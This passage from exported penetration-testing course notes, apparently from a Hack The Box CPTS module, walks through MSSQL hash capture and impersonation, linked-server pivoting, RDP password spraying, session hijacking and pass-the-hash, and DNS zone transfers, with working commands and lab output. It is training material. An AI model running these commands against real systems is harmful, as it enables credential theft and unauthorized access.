NTLMv2-SSP Username : SRVMSSQL\\demouser\n[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94an```\n\n#### XP_SUBDIRS Hash Stealing with impacket\n\nAttacking SQL Databases\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 \n[*] Config file parsed                                                 \n[*] Config file parsed                                                 \n[*] Config file parsed\n[*] Incoming connection (10.129.203.7,49728)\n[*] AUTHENTICATE_MESSAGE (WINSRV02\\mssqlsvc,WINSRV02)\n[*] User WINSRV02\\mssqlsvc authenticated successfully                        \n[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000\n[*] Closing down connection (10.129.203.7,49728)                      \n[*] Remaining connections []\n```\n\n---\n\n## Impersonate Existing Users with MSSQL\n\nSQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.\n\nFirst, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:\n\n#### Identify Users that We Can Impersonate\n\nAttacking SQL Databases\n\n```cmd-session\n1> SELECT distinct b.name\n2> FROM sys.server_permissions a\n3> INNER JOIN sys.server_principals b\n4> ON a.grantor_principal_id = b.principal_id\n5> WHERE a.permission_name = 'IMPERSONATE'\n6> GO\n\nname\n-----------------------------------------------\nsa\nben\nvalentin\n\n(3 rows affected)\n```\n\nTo get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:\n\n#### Verifying our Current User and Role\n\nAttacking SQL Databases\n\n```cmd-session\n1> SELECT SYSTEM_USER\n2> SELECT IS_SRVROLEMEMBER('sysadmin')\n3> go\n\n-----------\njulio                                                                                                                    \n\n(1 rows affected)\n\n-----------\n          0\n\n(1 rows affected)\n```\n\nAs the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement `EXECUTE AS LOGIN` and set it to the user we want to impersonate.\n\n#### Impersonating the SA User\n\nAttacking SQL Databases\n\n```cmd-session\n1> EXECUTE AS LOGIN = 'sa'\n2> SELECT SYSTEM_USER\n3> SELECT IS_SRVROLEMEMBER('sysadmin')\n4> GO\n\n-----------\nsa\n\n(1 rows affected)\n\n-----------\n          1\n\n(1 rows affected)\n```\n\n**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using `USE master`.\n\nWe can now execute any command as a sysadmin as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.\n\n**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.\n\n---\n\n## Communicate with Other Databases with MSSQL\n\n`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.\n\nIf we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.\n\n#### Identify linked Servers in MSSQL\n\nAttacking SQL Databases\n\n```cmd-session\n1> SELECT srvname, isremote FROM sysservers\n2> GO\n\nsrvname                             isremote\n----------------------------------- --------\nDESKTOP-MFERMN4\\SQLEXPRESS          1\n10.0.0.12\\SQLEXPRESS                0\n\n(2 rows affected)\n```\n\nAs we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.\n\nNext, we can attempt to identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).\n\nAttacking SQL Databases\n\n```cmd-session\n1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]\n2> GO\n\n------------------------------ ------------------------------ ------------------------------ -----------\nDESKTOP-0L9D4KA\\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1\n\n(1 rows affected)\n```\n\n**Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).\n\nAs we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql), SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database), and [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/10- Latest SQL Vulnerabilities",
    "path": "02_CPTS/10-Attacking Common Services/10- Latest SQL Vulnerabilities.md",
    "title": "10  Latest SQL Vulnerabilities",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- This time let's discuss a vulnerability that does not have a CVE and does not require a direct exploit. The previous section shows that we can get the NTLMv2 hashes by interacting with the MSSQL s...",
    "category": "02_CPTS",
    "content": " \n---\n\nThis time let's discuss a vulnerability that does not have a CVE and does not require a direct exploit. The previous section shows that we can get the `NTLMv2` hashes by interacting with the MSSQL server. However, we should mention again that this attack is possible through a direct connection to the MSSQL server and vulnerable web applications. However, we will only focus on the simpler variant for the time being, namely the direct interaction.\n\n---\n\n## The Concept of the Attack\n\nWe will focus on the undocumented MSSQL server function called `xp_dirtree` for this vulnerability. This function is used to view the contents of a specific folder (local or remote). Furthermore, this function provides some additional parameters that can be specified. These include the depth, how far the function should go in the folder, and the actual target folder.\n\n#### The Concept of Attacks\n\n![Diagram showing flow from Source to Processes, Privileges, and Destination with related components.](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)\n\nThe interesting thing is that the MSSQL function `xp_dirtree` is not directly a vulnerability but takes advantage of the authentication mechanism of SMB. When we try to access a shared folder on the network with a Windows host, this Windows host automatically sends an `NTLMv2` hash for authentication.\n\nThis hash can be used in various ways against the MSSQL server and other hosts in the corporate network. This includes an SMB Relay attack where we \"replay\" the hash to log into other systems where the account has local admin privileges or `cracking` this hash on our local system. Successful cracking would allow us to see and use the password in cleartext. A successful SMB Relay attack would grant us admin rights on another host in the network, but not necessarily the host where the hash originated because Microsoft patched an older flaw that allowed an SMB Relay back to the originating host. We could, however, possibly gain local admin to another host and then steal credentials that could be re-used to gain local admin access to the original system where the NTLMv2 hash originated from.\n\n#### Initiation of the Attack\n\n|**Step**|**XP_DIRTREE**|**Concept of Attacks - Category**|\n|---|---|---|\n|`1.`|The source here is the user input, which specifies the function and the folder shared in the network.|`Source`|\n|`2.`|The process should ensure that all contents of the specified folder are displayed to the user.|`Process`|\n|`3.`|The execution of system commands on the MSSQL server requires elevated privileges with which the service executes the commands.|`Privileges`|\n|`4.`|The SMB service is used as the destination to which the specified information is forwarded.|`Destination`|\n\nThis is when the cycle starts all over again, but this time to obtain the NTLMv2 hash of the MSSQL service user.\n\n#### Steal The Hash\n\n|**Step**|**Stealing the Hash**|**Concept of Attacks - Category**|\n|---|---|---|\n|`5.`|Here, the SMB service receives the information about the specified order through the previous process of the MSSQL service.|`Source`|\n|`6.`|The data is then processed, and the specified folder is queried for the contents.|`Process`|\n|`7.`|The associated authentication hash is used accordingly since the MSSQL running user queries the service.|`Privileges`|\n|`8.`|In this case, the destination for the authentication and query is the host we control and the shared folder on the network.|`Destination`|\n\nFinally, the hash is intercepted by tools like `Responder`, `WireShark`, or `TCPDump` and displayed to us, which we can try to use for our purposes. Apart from that, there are many different ways to execute commands in MSSQL. For example, another interesting method would be to execute Python code in a SQL query. We can find more about this in the [documentation](https://docs.microsoft.com/en-us/sql/machine-learning/tutorials/quickstart-python-create-script?view=sql-server-ver15) from Microsoft. However, this and other possibilities of what we can do with MSSQL will be discussed in another module.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/11- Attacking RDP",
    "path": "02_CPTS/10-Attacking Common Services/11- Attacking RDP.md",
    "title": "11  Attacking RDP",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. It is also one...",
    "category": "02_CPTS",
    "content": "[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection. It is also one of the most popular administration tools, allowing system administrators to centrally control their remote systems with the same functionality as if they were on-site. In addition, managed service providers (MSPs) often use the tool to manage hundreds of customer networks and systems. Unfortunately, while RDP greatly facilitates remote administration of distributed IT systems, it also creates another gateway for attacks.\n\nBy default, RDP uses port `TCP/3389`. Using `Nmap`, we can identify the available RDP service on the target host:\n\nAttacking RDP\n\n```shell-session\ndrxh3kr@htb[/htb]# nmap -Pn -p3389 192.168.2.143 \n\nHost discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST\nNmap scan report for 192.168.2.143\nHost is up (0.00037s latency).\n\nPORT     STATE    SERVICE\n3389/tcp open ms-wbt-server\n```\n\n---\n\n## Misconfigurations\n\nSince RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.\n\nOne caveat on password guessing against Windows instances is that you should consider the client's password policy. In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called `Password Spraying`. This technique works by attempting a single password for many usernames before trying another password, being careful to avoid account lockout.\n\nUsing the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file. The attack found the valid credentials as `administrator` : `password123` on the target RDP host.\n\nAttacking RDP\n\n```shell-session\ndrxh3kr@htb[/htb]# cat usernames.txt \n\nroot\ntest\nuser\nguest\nadmin\nadministrator\n```\n\n#### Crowbar - RDP Password Spraying\n\nAttacking RDP\n\n```shell-session\ndrxh3kr@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'\n\n2022-04-07 15:35:50 START\n2022-04-07 15:35:50 Crowbar v0.4.1\n2022-04-07 15:35:50 Trying 192.168.220.142:3389\n2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123\n2022-04-07 15:35:52 STOP\n```\n\nWe can also use `Hydra` to perform an RDP password spray attack.\n\n#### Hydra - RDP Password Spraying\n\nAttacking RDP\n\n```shell-session\ndrxh3kr@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp\n\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52\n[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover\n[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)\n[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task\n[DATA] attacking rdp://192.168.2.147:3389/\n[3389][rdp] host: 192.168.2.143   login: administrator   password: password123\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56\n```\n\nWe can RDP into the target system using the `rdesktop` client or `xfreerdp` client with valid credentials.\n\n#### RDP Login\n\nAttacking RDP\n\n```shell-session\ndrxh3kr@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143\n\nAutoselecting keyboard map 'en-us' from locale\n\nATTENTION! The server uses an invalid security certificate which can not be trusted for\nthe following identified reasons(s);\n\n 1. Certificate issuer is not trusted by this system.\n     Issuer: CN=WIN-Q8F2KTAI43A\n\nReview the following certificate info before you trust it to be added as an exception.\nIf you do not trust the certificate, the connection atempt will be aborted:\n\n    Subject: CN=WIN-Q8F2KTAI43A\n     Issuer: CN=WIN-Q8F2KTAI43A\n Valid From: Tue Aug 24 04:20:17 2021\n         To: Wed Feb 23 03:20:17 2022\n\n  Certificate fingerprints:\n\n       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a\n     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57\n\nDo you trust this certificate (yes/no)? yes\n```\n\n![Terminal displaying rdesktop command to connect to Windows Server 2012 R2 with desktop icons visible.](https://academy.hackthebox.com/storage/modules/116/rdp_session-7-2.png)\n\n---\n\n## Protocol Specific Attacks\n\nLet's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.\n\n#### RDP Session Hijacking\n\nAs shown in the example below, we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.\n\n![Windows Server desktop with Task Manager and PowerShell showing user sessions.](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)\n\nTo successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:\n\nAttacking RDP\n\n```cmd-session\nC:\\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}\n```\n\nIf we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.\n\nAttacking RDP\n\n```cmd-session\nC:\\htb> query user\n\n USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\n>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM\n lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM\n\nC:\\htb> sc.exe create sessionhijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#13\"\n\n[SC] CreateService SUCCESS\n```\n\n![PowerShell session displaying user queries and service creation command with success message.](https://academy.hackthebox.com/storage/modules/116/rdp_session-2-2.png)\n\nTo run the command, we can start the `sessionhijack` service :\n\nAttacking RDP\n\n```cmd-session\nC:\\htb> net start sessionhijack\n```\n\nOnce the service is started, a new terminal with the `lewen` user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.\n\n![PowerShell session showing 'whoami' command and Task Manager with user sessions.](https://academy.hackthebox.com/storage/modules/116/rdp_session-3-2.png)\n\n_Note: This method no longer works on Server 2019._\n\n---\n\n## RDP Pass-the-Hash (PtH)\n\nWe may want to access applications or software installed on a user's Windows system that is only available with GUI access during a penetration test. If we have plaintext credentials for the target user, it will be no problem to RDP into the system. However, what if we only have the NT hash of the user obtained from a credential dumping attack such as [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) database, and we could not crack the hash to reveal the plaintext password? In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.\n\nThere are a few caveats to this attack:\n\n- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:\n\n![Error message: Account restrictions prevent sign-in due to blank passwords, limited sign-in times, or policy restrictions. OK button present.](https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png)\n\nThis can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa`. It can be done using the following command:\n\n#### Adding the DisableRestrictedAdmin Registry Key\n\nAttacking RDP\n\n```cmd-session\nC:\\htb> reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n```\n\n![Registry Editor showing path: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa. Highlighted entry: DisableRestrictedAdmin, REG_DWORD, value 0.](https://academy.hackthebox.com/storage/modules/116/rdp_session-5.png)\n\nOnce the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access:\n\nAttacking RDP\n\n```shell-session\ndrxh3kr@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9\n\n[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            \n[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   \n[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  \n[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 \n[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               \n[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state\n[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        \n[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0\n[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               \n[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        \n[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags \"0xE2898235\"\n\n<SNIP>\n\n```\n\nIf it works, we'll now be logged in via RDP as the target user without knowing their cleartext password.\n\n![Remote desktop session showing PowerShell on Windows Server 2012 R2. Command 'whoami' executed, output: 'superstore\\lewen'.](https://academy.hackthebox.com/storage/modules/116/rdp_session-6-2.png)\n\nKeep in mind that this will not work against every Windows system we encounter, but it is always worth trying in a situation where we have an NTLM hash, know the user has RDP rights against a machine or set of machines, and GUI access would benefit us in some ways towards fulfilling the goal of our assessment.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/12- Latest RDP Vulnerabilities",
    "path": "02_CPTS/10-Attacking Common Services/12- Latest RDP Vulnerabilities.md",
    "title": "12  Latest RDP Vulnerabilities",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- In 2019, a critical vulnerability was published in the RDP (TCP/3389) service that also led to remote code execution (RCE) with the identifier CVE-2019-0708. This vulnerability is known as BlueKee...",
    "category": "02_CPTS",
    "content": "\n---\n\nIn 2019, a critical vulnerability was published in the RDP (`TCP/3389`) service that also led to remote code execution (`RCE`) with the identifier [CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708). This vulnerability is known as `BlueKeep`. It does not require prior access to the system to exploit the service for our purposes. However, the exploitation of this vulnerability led and still leads to many malware or ransomware attacks. Large organizations such as hospitals, whose software is only designed for specific versions and libraries, are particularly vulnerable to such attacks, as infrastructure maintenance is costly. Here, too, we will not go into minute detail about this vulnerability but rather keep the focus on the concept.\n\n---\n\n## The Concept of the Attack\n\nThe vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service. However, the dangerous thing here is that the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a [Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) (`UAF`) technique that uses freed memory to execute arbitrary code.\n\n#### The Concept of Attacks\n\n![Flowchart with four stages: Source (Code, Libraries, Config, APIs, User Input), Processes (PID, Input, Data processing, Variables, Logging), Privileges (System, User, Groups, Policies, Rules), and Destination (Local: Files, Process; Network: Interface, Network Address, Route).](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)\n\nThis attack involves many different steps in the kernel of the operating system, which are not of great importance here for the time being to understand the concept behind it. After the function has been exploited and the memory has been freed, data is written to the kernel, which allows us to overwrite the kernel memory. This memory is used to write our instructions into the freed memory and let the CPU execute them. If we want to look at the technical analysis of the BlueKeep vulnerability, this [article](https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/) provides a nice overview.\n\n#### Initiation of the Attack\n\n|**Step**|**BlueKeep**|**Concept of Attacks - Category**|\n|---|---|---|\n|`1.`|Here, the source is the initialization request of the settings exchange between server and client that the attacker has manipulated.|`Source`|\n|`2.`|The request leads to a function used to create a virtual channel containing the vulnerability.|`Process`|\n|`3.`|Since this service is suitable for [administering](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) of the system, it is automatically run with the [LocalSystem Account](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) privileges of the system.|`Privileges`|\n|`4.`|The manipulation of the function redirects us to a kernel process.|`Destination`|\n\nThis is when the cycle starts all over again, but this time to gain remote access to the target system.\n\n#### Trigger Remote Code Execution\n\n|**Step**|**BlueKeep**|**Concept of Attacks - Category**|\n|---|---|---|\n|`5.`|The source this time is the payload created by the attacker that is inserted into the process to free the memory in the kernel and place our instructions.|`Source`|\n|`6.`|The process in the kernel is triggered to free the kernel memory and let the CPU point to our code.|`Process`|\n|`7.`|Since the kernel also runs with the highest possible privileges, the instructions we put into the freed kernel memory here are also executed with [LocalSystem Account](https://docs.microsoft.com/en-us/windows/win32/ad/the-localsystem-account) privileges.|`Privileges`|\n|`8.`|With the execution of our instructions from the kernel, a reverse shell is sent over the network to our host.|`Destination`|\n\nNot all newer Windows variants are vulnerable to Bluekeep, according to Microsoft. Security updates for current Windows versions are available, and Microsoft has also provided updates for many older Windows versions that are no longer supported. Nevertheless, `950,000` Windows systems were identified as vulnerable to `Bluekeep` attacks in an initial scan in May 2019, and even today, about `a quarter` of those hosts are still vulnerable.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/13- Attacking DNS",
    "path": "02_CPTS/10-Attacking Common Services/13- Attacking DNS.md",
    "title": "13  Attacking DNS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The Domain Name System (DNS) translates domain names (e.g., hackthebox.com) to the numerical IP addresses (e.g., 104.17.42.72). DNS is mostly UDP/53, but DNS will rely on TCP/53 more heavily as time p...",
    "category": "02_CPTS",
    "content": "The [Domain Name System](https://www.cloudflare.com/learning/dns/what-is-dns/) (`DNS`) translates domain names (e.g., hackthebox.com) to the numerical IP addresses (e.g., 104.17.42.72). DNS is mostly `UDP/53`, but DNS will rely on `TCP/53` more heavily as time progresses. DNS has always been designed to use both UDP and TCP port 53 from the start, with UDP being the default, and falls back to using TCP when it cannot communicate on UDP, typically when the packet size is too large to push through in a single UDP packet. Since nearly all network applications use DNS, attacks against DNS servers represent one of the most prevalent and significant threats today.\n\n---\n\n## Enumeration\n\nDNS holds interesting information for an organization. As discussed in the Domain Information section in the [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), we can understand how a company operates and the services they provide, as well as third-party service providers like emails.\n\nThe Nmap `-sC` (default scripts) and `-sV` (version scan) options can be used to perform initial enumeration against the target DNS servers:\n\nAttacking DNS\n\n```shell-session\ndrxh3kr@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT\nNmap scan report for 10.10.110.213\nHost is up (0.017s latency).\n\nPORT    STATE  SERVICE     VERSION\n53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)\n```\n\n---\n\n## DNS Zone Transfer\n\nA DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. Since DNS comprises multiple DNS zones, DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. Unless a DNS server is configured correctly (limiting which IPs can perform a DNS zone transfer), anyone can ask a DNS server for a copy of its zone information since DNS zone transfers do not require any authentication. In addition, the DNS service usually runs on a UDP port; however, when performing DNS zone transfer, it uses a TCP port for reliable data transmission.\n\nAn attacker could leverage this DNS zone transfer vulnerability to learn more about the target organization's DNS namespace, increasing the attack surface. For exploitation, we can use the `dig` utility with DNS query type `AXFR` option to dump the entire DNS namespaces from a vulnerable DNS server:\n\n#### DIG - AXFR Zone Transfer\n\nAttacking DNS\n\n```shell-session\ndrxh3kr@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb\n\n; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213\n;; global options: +cmd\ninlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\ninlanefrieght.htb.         604800  IN      AAAA    ::1\ninlanefrieght.htb.         604800  IN      NS      localhost.\ninlanefrieght.htb.         604800  IN      A       10.129.110.22\nadmin.inlanefrieght.htb.   604800  IN      A       10.129.110.21\nhr.inlanefrieght.htb.      604800  IN      A       10.129.110.25\nsupport.inlanefrieght.htb. 604800  IN      A       10.129.110.28\ninlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800\n;; Query time: 28 msec\n;; SERVER: 10.129.110.213#53(10.129.110.213)\n;; WHEN: Mon Oct 11 17:20:13 EDT 2020\n;; XFR size: 8 records (messages 1, bytes 289)\n```\n\nTools like [Fierce](https://github.com/mschwager/fierce) can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:\n\nAttacking DNS\n\n```shell-session\ndrxh3kr@htb[/htb]# fierce --domain zonetransfer.me\n\nNS: nsztm2.digi.ninja. nsztm1.digi.ninja.\nSOA: nsztm1.digi.ninja. (81.4.108.41)\nZone: success\n{<DNS name @>: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '\n               '172800 900 1209600 3600\\n'\n               '@ 300 IN HINFO \"Casio fx-700G\" \"Windows XP\"\\n'\n               '@ 301 IN TXT '\n               '\"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA\"\\n'\n               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\\n'\n               '@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\\n'\n               '@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\\n'\n               '@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\\n'\n               '@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\\n'\n               '@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\\n'\n               '@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\\n'\n               '@ 7200 IN A 5.196.105.14\\n'\n               '@ 7200 IN NS nsztm1.digi.ninja.\\n'\n               '@ 7200 IN NS nsztm2.digi.ninja.',\n <DNS name _acme-challenge>: '_acme-challenge 301 IN TXT '\n                             